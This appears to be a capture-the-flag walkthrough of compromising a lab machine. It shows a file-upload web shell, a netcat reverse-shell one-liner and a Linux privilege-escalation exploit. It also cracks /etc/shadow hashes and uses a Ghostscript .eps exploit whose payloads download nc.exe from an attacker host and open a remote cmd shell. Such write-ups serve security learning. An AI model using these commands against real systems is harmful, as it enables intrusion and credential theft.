File upload attack

i uploaded a normal picture first, to see if it get uploaded, it worked. Then i guessed that a /uploads folder might exist, so i tried /upload/picture.jpg and it worked. Utilizing gobuster also found the uploads directory.

Used https://github.com/flozz/p0wny-shell and got a web shell becaused if used normal shell like pentest-monkey it did not work.

Using revshell.com "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.*.* 4444 >/tmp/f" i got a shell in my machine which was a linux machine, the machine itself it a windows so here we have to find another way to get to the windows machine. 

Upon examination, using the "cat /etc/os-release" the Ubuntu 23.04 version is identified. Searching for vulnerabilities, https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 is found. Using the exploit.sh we get root.

Inspect the contents of /etc/passwd and found a user Drwilliams, check the /etc/shadow for hash, capture it and crack it with john or hashcat
hashcat <hash file> /usr/share/wordlists/rockyou.txt --show

we the obtained username and password we try to log in to the webmail on port443 which worked.
Exploring the webmail service, it appears a platform for sending emails. An email is received in the form of an .eps file, which after research such files often leverage Ghostscript for execution.

python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.16/nc64.exe -o nc.exe" --filename file.eps after generating the file deliver it via reply to the user. On your web server check that nc was accessed. Then generate this
python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.16.16 4444 -e cmd.exe" --filename file.eps and transfer that too. Meanwhile a listener on the attacking machine has to be opened.


There is a ghostscript.bat file along with a password. Attempt to access the rpcclient and use "querydispinfo" to examine the data. Administration Information is shared with the Guest. Attempting to upload a webshell onto the web service for the purpose of investigation the permissions it operates with in xampp\htdocs.

Download on that folder the p0wny shell and get the access to root flag.
